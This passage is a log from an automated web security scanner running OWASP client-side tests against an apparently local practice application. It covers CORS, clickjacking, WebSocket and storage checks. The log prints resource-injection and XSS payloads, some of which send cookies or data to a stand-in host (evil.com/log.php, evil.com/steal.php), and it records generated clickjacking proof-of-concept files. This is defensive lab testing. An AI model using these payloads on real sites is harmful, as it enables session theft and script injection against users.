+2025-08-05 14:45:55.136683 |     [-] No obvious resource injection with payload 'http://evil.com\@attacker.com' (URL parameter)
+2025-08-05 14:45:55.137691 |   - Testing payload: http://evil.com?.victim.com
+2025-08-05 14:45:55.144289 |     [-] No obvious resource injection with payload 'http://evil.com?.victim.com' (URL parameter)
+2025-08-05 14:45:55.144289 |   - Testing payload: chrome-extension://malicious
+2025-08-05 14:45:55.150882 |     [-] No obvious resource injection with payload 'chrome-extension://malicious' (URL parameter)
+2025-08-05 14:45:55.151882 |   - Testing payload: ms-browser-extension://malicious
+2025-08-05 14:45:55.157717 |     [-] No obvious resource injection with payload 'ms-browser-extension://malicious' (URL parameter)
+2025-08-05 14:45:55.157717 |   - Testing hash resource payload: http://evil.com/malicious.js
+2025-08-05 14:45:55.163717 |     [-] No obvious resource injection with payload 'http://evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:55.164724 |   - Testing hash resource payload: //evil.com/malicious.js
+2025-08-05 14:45:55.170494 |     [-] No obvious resource injection with payload '//evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:55.170494 |   - Testing hash resource payload: data:text/javascript,alert(1)
+2025-08-05 14:45:55.176630 |     [-] No obvious resource injection with payload 'data:text/javascript,alert(1)' (URL hash)
+2025-08-05 14:45:55.177630 |   - Testing hash resource payload: http://evil.com/phishing.html
+2025-08-05 14:45:55.182809 |     [-] No obvious resource injection with payload 'http://evil.com/phishing.html' (URL hash)
+2025-08-05 14:45:55.183811 |   - Testing hash resource payload: javascript:alert(document.cookie)
+2025-08-05 14:45:55.190027 |     [-] No obvious resource injection with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:45:55.190027 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/cors/
+2025-08-05 14:45:55.192039 |   - No obvious resource sinks found in page source
+2025-08-05 14:45:55.192039 |   - Testing payload: http://evil.com/malicious.js
+2025-08-05 14:45:55.194040 |     [!] HTTP 404 with payload 'http://evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:55.194040 |   - Testing payload: //evil.com/malicious.js
+2025-08-05 14:45:55.195039 |     [!] HTTP 404 with payload '//evil.com/malicious.js' (URL parameter)
+2025-08-05 14:45:55.196041 |   - Testing payload: data:text/javascript,alert(1)
+2025-08-05 14:45:55.197545 |     [!] HTTP 404 with payload 'data:text/javascript,alert(1)' (URL parameter)
+2025-08-05 14:45:55.197545 |   - Testing payload: http://evil.com/phishing.html
+2025-08-05 14:45:55.199550 |     [!] HTTP 404 with payload 'http://evil.com/phishing.html' (URL parameter)
+2025-08-05 14:45:55.199550 |   - Testing payload: javascript:alert(document.cookie)
+2025-08-05 14:45:55.200709 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL parameter)
+2025-08-05 14:45:55.200709 |   - Testing payload: http://evil.com/log.php?cookie=${document.cookie}
+2025-08-05 14:45:55.203183 |     [!] HTTP 404 with payload 'http://evil.com/log.php?cookie=${document.cookie}' (URL parameter)
+2025-08-05 14:45:55.203183 |   - Testing payload: x" onerror="alert(1)
+2025-08-05 14:45:55.205177 |     [!] HTTP 404 with payload 'x" onerror="alert(1)' (URL parameter)
+2025-08-05 14:45:55.205177 |   - Testing payload: http://evil.com/malicious.swf
+2025-08-05 14:45:55.207176 |     [!] HTTP 404 with payload 'http://evil.com/malicious.swf' (URL parameter)
+2025-08-05 14:45:55.207176 |   - Testing payload: data:application/x-shockwave-flash,alert(1)
+2025-08-05 14:45:55.209176 |     [!] HTTP 404 with payload 'data:application/x-shockwave-flash,alert(1)' (URL parameter)
+2025-08-05 14:45:55.209176 |   - Testing payload: http://evil.com/malicious.css
+2025-08-05 14:45:55.211346 |     [!] HTTP 404 with payload 'http://evil.com/malicious.css' (URL parameter)
+2025-08-05 14:45:55.211346 |   - Testing payload: javascript:alert(1);
+2025-08-05 14:45:55.212364 |     [!] HTTP 404 with payload 'javascript:alert(1);' (URL parameter)
+2025-08-05 14:45:55.213359 |   - Testing payload: http://evil.com/steal.php?data=
+2025-08-05 14:45:55.214359 |     [!] HTTP 404 with payload 'http://evil.com/steal.php?data=' (URL parameter)
+2025-08-05 14:45:55.215363 |   - Testing payload: /api/userdata?callback=evilFunction
+2025-08-05 14:45:55.216360 |     [!] HTTP 404 with payload '/api/userdata?callback=evilFunction' (URL parameter)
+2025-08-05 14:45:55.216360 |   - Testing payload: hTtP://evil.com
+2025-08-05 14:45:55.218359 |     [!] HTTP 404 with payload 'hTtP://evil.com' (URL parameter)
+2025-08-05 14:45:55.219361 |   - Testing payload: http://127.0.0.1@evil.com
+2025-08-05 14:45:55.220362 |     [!] HTTP 404 with payload 'http://127.0.0.1@evil.com' (URL parameter)
+2025-08-05 14:45:55.220362 |   - Testing payload: http://evil.com\@attacker.com
+2025-08-05 14:45:55.222562 |     [!] HTTP 404 with payload 'http://evil.com\@attacker.com' (URL parameter)
+2025-08-05 14:45:55.222562 |   - Testing payload: http://evil.com?.victim.com
+2025-08-05 14:45:55.224568 |     [!] HTTP 404 with payload 'http://evil.com?.victim.com' (URL parameter)
+2025-08-05 14:45:55.224568 |   - Testing payload: chrome-extension://malicious
+2025-08-05 14:45:55.225567 |     [!] HTTP 404 with payload 'chrome-extension://malicious' (URL parameter)
+2025-08-05 14:45:55.226564 |   - Testing payload: ms-browser-extension://malicious
+2025-08-05 14:45:55.227564 |     [!] HTTP 404 with payload 'ms-browser-extension://malicious' (URL parameter)
+2025-08-05 14:45:55.228563 |   - Testing hash resource payload: http://evil.com/malicious.js
+2025-08-05 14:45:55.229564 |     [!] HTTP 404 with payload 'http://evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:55.229564 |   - Testing hash resource payload: //evil.com/malicious.js
+2025-08-05 14:45:55.231562 |     [!] HTTP 404 with payload '//evil.com/malicious.js' (URL hash)
+2025-08-05 14:45:55.231562 |   - Testing hash resource payload: data:text/javascript,alert(1)
+2025-08-05 14:45:55.233757 |     [!] HTTP 404 with payload 'data:text/javascript,alert(1)' (URL hash)
+2025-08-05 14:45:55.233757 |   - Testing hash resource payload: http://evil.com/phishing.html
+2025-08-05 14:45:55.234756 |     [!] HTTP 404 with payload 'http://evil.com/phishing.html' (URL hash)
+2025-08-05 14:45:55.235753 |   - Testing hash resource payload: javascript:alert(document.cookie)
+2025-08-05 14:45:55.236755 |     [!] HTTP 404 with payload 'javascript:alert(document.cookie)' (URL hash)
+2025-08-05 14:45:55.236755 | ----- OTG-CLIENT-006 Test Completed -----
+
+2025-08-05 15:14:52.209307 | [+] Login successful (Status: 200)
+2025-08-05 15:14:52.261989 | [+] Security level set to low
+2025-08-05 15:14:52.261989 | ----- Starting OTG-CLIENT-007 (CORS Testing) -----
+2025-08-05 15:14:52.262975 | 
+[i] Testing endpoint: http://localhost:8080/vulnerabilities/cors/
+2025-08-05 15:14:52.262975 |   - Testing case: Wildcard Origin
+2025-08-05 15:14:52.264973 |     [-] No vulnerability detected for Wildcard Origin
+2025-08-05 15:14:52.264973 |   - Testing case: Reflected Origin
+2025-08-05 15:14:52.266896 |     [-] No vulnerability detected for Reflected Origin
+2025-08-05 15:14:52.266896 |   - Testing case: Null Origin
+2025-08-05 15:14:52.268916 |     [-] No vulnerability detected for Null Origin
+2025-08-05 15:14:52.268916 |   - Testing case: Credentials with Wildcard
+2025-08-05 15:14:52.271905 |     [-] No vulnerability detected for Credentials with Wildcard
+2025-08-05 15:14:52.271905 |   - Testing preflight for method: DELETE
+2025-08-05 15:14:52.273902 |   - Testing preflight for method: PUT
+2025-08-05 15:14:52.274901 | 
+[i] Testing endpoint: http://localhost:8080/vulnerabilities/xss_r/
+2025-08-05 15:14:52.275901 |   - Testing case: Wildcard Origin
+2025-08-05 15:14:52.279088 |     [-] No vulnerability detected for Wildcard Origin
+2025-08-05 15:14:52.280087 |   - Testing case: Reflected Origin
+2025-08-05 15:14:52.283109 |     [-] No vulnerability detected for Reflected Origin
+2025-08-05 15:14:52.284115 |   - Testing case: Null Origin
+2025-08-05 15:14:52.287146 |     [-] No vulnerability detected for Null Origin
+2025-08-05 15:14:52.287146 |   - Testing case: Credentials with Wildcard
+2025-08-05 15:14:52.291237 |     [-] No vulnerability detected for Credentials with Wildcard
+2025-08-05 15:14:52.291237 |   - Testing preflight for method: DELETE
+2025-08-05 15:14:52.294816 |   - Testing preflight for method: PUT
+2025-08-05 15:14:52.297703 | 
+[i] Testing endpoint: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 15:14:52.298208 |   - Testing case: Wildcard Origin
+2025-08-05 15:14:52.301853 |     [-] No vulnerability detected for Wildcard Origin
+2025-08-05 15:14:52.301853 |   - Testing case: Reflected Origin
+2025-08-05 15:14:52.305912 |     [-] No vulnerability detected for Reflected Origin
+2025-08-05 15:14:52.305912 |   - Testing case: Null Origin
+2025-08-05 15:14:52.309911 |     [-] No vulnerability detected for Null Origin
+2025-08-05 15:14:52.309911 |   - Testing case: Credentials with Wildcard
+2025-08-05 15:14:52.314889 |     [-] No vulnerability detected for Credentials with Wildcard
+2025-08-05 15:14:52.314889 |   - Testing preflight for method: DELETE
+2025-08-05 15:14:52.319111 |   - Testing preflight for method: PUT
+2025-08-05 15:14:52.322461 | 
+[i] Testing endpoint: http://localhost:8080/login.php
+2025-08-05 15:14:52.322982 |   - Testing case: Wildcard Origin
+2025-08-05 15:14:52.326204 |     [-] No vulnerability detected for Wildcard Origin
+2025-08-05 15:14:52.327210 |   - Testing case: Reflected Origin
+2025-08-05 15:14:52.330207 |     [-] No vulnerability detected for Reflected Origin
+2025-08-05 15:14:52.331210 |   - Testing case: Null Origin
+2025-08-05 15:14:52.335217 |     [-] No vulnerability detected for Null Origin
+2025-08-05 15:14:52.335217 |   - Testing case: Credentials with Wildcard
+2025-08-05 15:14:52.339330 |     [-] No vulnerability detected for Credentials with Wildcard
+2025-08-05 15:14:52.339330 |   - Testing preflight for method: DELETE
+2025-08-05 15:14:52.343083 |   - Testing preflight for method: PUT
+2025-08-05 15:14:52.346144 | 
+[i] Testing endpoint: http://localhost:8080/api/
+2025-08-05 15:14:52.346144 |   - Testing case: Wildcard Origin
+2025-08-05 15:14:52.348256 |     [-] No vulnerability detected for Wildcard Origin
+2025-08-05 15:14:52.348256 |   - Testing case: Reflected Origin
+2025-08-05 15:14:52.350258 |     [-] No vulnerability detected for Reflected Origin
+2025-08-05 15:14:52.350258 |   - Testing case: Null Origin
+2025-08-05 15:14:52.352258 |     [-] No vulnerability detected for Null Origin
+2025-08-05 15:14:52.352258 |   - Testing case: Credentials with Wildcard
+2025-08-05 15:14:52.353256 |     [-] No vulnerability detected for Credentials with Wildcard
+2025-08-05 15:14:52.354320 |   - Testing preflight for method: DELETE
+2025-08-05 15:14:52.355319 |   - Testing preflight for method: PUT
+2025-08-05 15:14:52.357319 | ----- OTG-CLIENT-007 Test Completed -----
+
+2025-08-05 15:16:04.723915 | [+] Login successful (Status: 200)
+2025-08-05 15:16:04.773865 | [+] Security level set to low
+2025-08-05 15:16:07.955134 | [+] Login successful (Status: 200)
+2025-08-05 15:16:08.008921 | [+] Security level set to low
+2025-08-05 15:16:08.009921 | ----- Starting OTG-CLIENT-008 (Cross Site Flashing) -----
+2025-08-05 15:16:08.009921 | 
+[i] Testing Flash endpoint: http://localhost:8080/flash/
+2025-08-05 15:16:08.012130 |   - Endpoint not found (HTTP 404)
+2025-08-05 15:16:08.012130 | 
+[i] Testing Flash endpoint: http://localhost:8080/swf/
+2025-08-05 15:16:08.014132 |   - Endpoint not found (HTTP 404)
+2025-08-05 15:16:08.015133 | 
+[i] Testing Flash endpoint: http://localhost:8080/player.swf
+2025-08-05 15:16:08.017133 |   - Endpoint not found (HTTP 404)
+2025-08-05 15:16:08.017133 | 
+[i] Testing Flash endpoint: http://localhost:8080/main.swf
+2025-08-05 15:16:08.019133 |   - Endpoint not found (HTTP 404)
+2025-08-05 15:16:08.019133 | 
+[i] Testing Flash endpoint: http://localhost:8080/content/flashfile.swf
+2025-08-05 15:16:08.021398 |   - Endpoint not found (HTTP 404)
+2025-08-05 15:16:08.021398 | 
+[i] For complete analysis, consider decompiling SWF files with tools like:
+2025-08-05 15:16:08.022388 |     - flare (ActionScript 2.0)
+2025-08-05 15:16:08.022388 |     - jpexs-decompiler
+2025-08-05 15:16:08.022388 |     - SWFScan (commercial)
+2025-08-05 15:16:08.022388 |     - ffdec (free)
+2025-08-05 15:16:08.023388 | ----- OTG-CLIENT-008 Test Completed -----
+
+2025-08-05 15:20:22.342380 | [+] Login successful (Status: 200)
+2025-08-05 15:20:22.396675 | [+] Security level set to low
+2025-08-05 15:20:22.396675 | ----- Starting OTG-CLIENT-009 (Clickjacking) -----
+2025-08-05 15:20:22.397703 | 
+[i] Testing endpoint: http://localhost:8080/vulnerabilities/csrf/
+2025-08-05 15:20:22.400868 |   [✓] Missing X-Frame-Options header - vulnerable to clickjacking
+      Recommendation: Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.401866 |   [✓] Missing frame-ancestors in CSP - vulnerable to clickjacking
+      Recommendation: Add Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.401866 |   [*] Checking for frame busting JavaScript
+2025-08-05 15:20:22.401866 |     [✓] No frame busting JavaScript detected - vulnerable to clickjacking
+        Recommendation: Implement frame busting JavaScript or use X-Frame-Options/CSP
+2025-08-05 15:20:22.403192 |   [*] Created clickjacking PoC: clickjacking_poc_.html
+2025-08-05 15:20:22.403192 | 
+[i] Testing endpoint: http://localhost:8080/account/transfer
+2025-08-05 15:20:22.405568 |   [✓] Missing X-Frame-Options header - vulnerable to clickjacking
+      Recommendation: Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.405568 |   [✓] Missing frame-ancestors in CSP - vulnerable to clickjacking
+      Recommendation: Add Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.406999 |   [*] Checking for frame busting JavaScript
+2025-08-05 15:20:22.406999 |     [✓] No frame busting JavaScript detected - vulnerable to clickjacking
+        Recommendation: Implement frame busting JavaScript or use X-Frame-Options/CSP
+2025-08-05 15:20:22.408000 |   [*] Created clickjacking PoC: clickjacking_poc_transfer.html
+2025-08-05 15:20:22.408000 | 
+[i] Testing endpoint: http://localhost:8080/profile/update
+2025-08-05 15:20:22.410659 |   [✓] Missing X-Frame-Options header - vulnerable to clickjacking
+      Recommendation: Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.410659 |   [✓] Missing frame-ancestors in CSP - vulnerable to clickjacking
+      Recommendation: Add Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.410659 |   [*] Checking for frame busting JavaScript
+2025-08-05 15:20:22.411892 |     [✓] No frame busting JavaScript detected - vulnerable to clickjacking
+        Recommendation: Implement frame busting JavaScript or use X-Frame-Options/CSP
+2025-08-05 15:20:22.413008 |   [*] Created clickjacking PoC: clickjacking_poc_update.html
+2025-08-05 15:20:22.413008 | 
+[i] Testing endpoint: http://localhost:8080/admin/actions
+2025-08-05 15:20:22.415361 |   [✓] Missing X-Frame-Options header - vulnerable to clickjacking
+      Recommendation: Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.415361 |   [✓] Missing frame-ancestors in CSP - vulnerable to clickjacking
+      Recommendation: Add Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.415361 |   [*] Checking for frame busting JavaScript
+2025-08-05 15:20:22.416496 |     [✓] No frame busting JavaScript detected - vulnerable to clickjacking
+        Recommendation: Implement frame busting JavaScript or use X-Frame-Options/CSP
+2025-08-05 15:20:22.416496 |   [*] Created clickjacking PoC: clickjacking_poc_actions.html
+2025-08-05 15:20:22.417497 | 
+[i] Testing endpoint: http://localhost:8080/settings/change
+2025-08-05 15:20:22.420040 |   [✓] Missing X-Frame-Options header - vulnerable to clickjacking
+      Recommendation: Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.420040 |   [✓] Missing frame-ancestors in CSP - vulnerable to clickjacking
+      Recommendation: Add Content-Security-Policy: frame-ancestors 'none'
+2025-08-05 15:20:22.421090 |   [*] Checking for frame busting JavaScript
+2025-08-05 15:20:22.421090 |     [✓] No frame busting JavaScript detected - vulnerable to clickjacking
+        Recommendation: Implement frame busting JavaScript or use X-Frame-Options/CSP
+2025-08-05 15:20:22.422187 |   [*] Created clickjacking PoC: clickjacking_poc_change.html
+2025-08-05 15:20:22.422187 | 
+[i] Manual verification steps:
+2025-08-05 15:20:22.422187 |     1. Open generated HTML test files in browser
+2025-08-05 15:20:22.423187 |     2. Check if target page loads in frame despite protections
+2025-08-05 15:20:22.423187 |     3. Verify if UI elements can be overlayed/clickjacked
+2025-08-05 15:20:22.423187 | ----- OTG-CLIENT-009 Test Completed -----
+
+2025-08-05 15:29:16.259269 | [+] Login successful (Status: 200)
+2025-08-05 15:29:16.312945 | [+] Security level set to low
+2025-08-05 15:29:22.332363 | [+] Login successful (Status: 200)
+2025-08-05 15:29:22.386046 | [+] Security level set to low
+2025-08-05 15:29:29.390489 | [+] Login successful (Status: 200)
+2025-08-05 15:29:29.441812 | [+] Security level set to low
+2025-08-05 15:29:44.702940 | [+] Login successful (Status: 200)
+2025-08-05 15:29:44.756618 | [+] Security level set to low
+2025-08-05 15:29:53.363552 | [+] Login successful (Status: 200)
+2025-08-05 15:29:53.417942 | [+] Security level set to low
+2025-08-05 15:29:53.419123 | ----- Starting OTG-CLIENT-010 (WebSocket Testing) -----
+2025-08-05 15:29:53.470913 | 
+[i] Testing WebSocket endpoint: ws://localhost:8080/ws
+2025-08-05 15:29:53.475916 | [-] WebSocket connection failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '277', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /ws was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.484381 | [+] WebSocket rejected connection with invalid origin
+2025-08-05 15:29:53.490388 | [-] Input sanitization test failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '277', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /ws was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.490388 | 
+[i] Testing WebSocket endpoint: ws://localhost:8080/websocket
+2025-08-05 15:29:53.496388 | [-] WebSocket connection failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '284', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /websocket was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.501935 | [+] WebSocket rejected connection with invalid origin
+2025-08-05 15:29:53.507173 | [-] Input sanitization test failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '284', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /websocket was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.507173 | 
+[i] Testing WebSocket endpoint: ws://localhost:8080/socket
+2025-08-05 15:29:53.512172 | [-] WebSocket connection failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '281', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /socket was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.518239 | [+] WebSocket rejected connection with invalid origin
+2025-08-05 15:29:53.523240 | [-] Input sanitization test failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '281', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /socket was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.523240 | 
+[i] Testing WebSocket endpoint: ws://localhost:8080/wss
+2025-08-05 15:29:53.528929 | [-] WebSocket connection failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '278', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /wss was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.532931 | [+] WebSocket rejected connection with invalid origin
+2025-08-05 15:29:53.535991 | [-] Input sanitization test failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '278', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /wss was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.536990 | 
+[i] Testing WebSocket endpoint: ws://localhost:8080/live-updates
+2025-08-05 15:29:53.540593 | [-] WebSocket connection failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '287', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /live-updates was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.544591 | [+] WebSocket rejected connection with invalid origin
+2025-08-05 15:29:53.548772 | [-] Input sanitization test failed: Handshake status 404 Not Found -+-+- {'date': 'Tue, 05 Aug 2025 08:29:53 GMT', 'server': 'Apache/2.4.25 (Debian)', 'content-length': '287', 'content-type': 'text/html; charset=iso-8859-1'} -+-+- b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /live-updates was not found on this server.</p>\n<hr>\n<address>Apache/2.4.25 (Debian) Server at localhost Port 8080</address>\n</body></html>\n'
+2025-08-05 15:29:53.548772 | 
+[i] Manual testing recommendations:
+2025-08-05 15:29:53.549775 |   - Use browser developer tools to inspect WebSocket traffic
+2025-08-05 15:29:53.549775 |   - Test with ZAP's WebSocket tab for advanced manipulation
+2025-08-05 15:29:53.549775 |   - Verify wss:// is used for sensitive data transport
+2025-08-05 15:29:53.549775 | ----- OTG-CLIENT-010 Test Completed -----
+
+2025-08-05 15:41:44.481818 | [+] Login successful (Status: 200)
+2025-08-05 15:41:44.536167 | [+] Security level set to low
+2025-08-05 15:41:44.536167 | ----- Starting OTG-CLIENT-011 (Web Messaging Testing) -----
+2025-08-05 15:41:44.536167 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/web_messaging/
+2025-08-05 15:41:44.538563 | [-] Page not found: http://localhost:8080/vulnerabilities/web_messaging/
+2025-08-05 15:41:44.538563 | 
+[i] Testing page: http://localhost:8080/includes/web_messaging.js
+2025-08-05 15:41:44.540563 | [-] Page not found: http://localhost:8080/includes/web_messaging.js
+2025-08-05 15:41:44.540563 | 
+[i] Testing page: http://localhost:8080/js/messaging.js
+2025-08-05 15:41:44.542564 | [-] Page not found: http://localhost:8080/js/messaging.js
+2025-08-05 15:41:44.542564 | ----- OTG-CLIENT-011 Test Completed -----
+
+2025-08-05 15:48:52.598272 | [+] Login successful (Status: 200)
+2025-08-05 15:48:52.653364 | [+] Security level set to low
+2025-08-05 15:48:52.653364 | ----- Starting OTG-CLIENT-012 (Client-Side Storage Testing) -----
+2025-08-05 15:48:52.653364 | 
+[i] Testing page: http://localhost:8080/vulnerabilities/client_storage/
+2025-08-05 15:48:52.655693 | [-] Page not found: http://localhost:8080/vulnerabilities/client_storage/
+2025-08-05 15:48:52.655693 | 
+[i] Testing page: http://localhost:8080/includes/storage.js
+2025-08-05 15:48:52.658806 | [-] Page not found: http://localhost:8080/includes/storage.js
+2025-08-05 15:48:52.658806 | 
+[i] Testing page: http://localhost:8080/js/app.js
+2025-08-05 15:48:52.660812 | [-] Page not found: http://localhost:8080/js/app.js
+2025-08-05 15:48:52.660812 | 
+[i] Manual testing recommendations:
+2025-08-05 15:48:52.660812 |   - Use browser DevTools to inspect actual storage contents
+2025-08-05 15:48:52.660812 |   - Check for sensitive data in localStorage/sessionStorage
+2025-08-05 15:48:52.660812 |   - Verify IndexedDB for extractable CryptoKeys
+2025-08-05 15:48:52.660812 |   - Test for XSS via storage injection vectors
+2025-08-05 15:48:52.662317 | ----- OTG-CLIENT-012 Test Completed -----
+
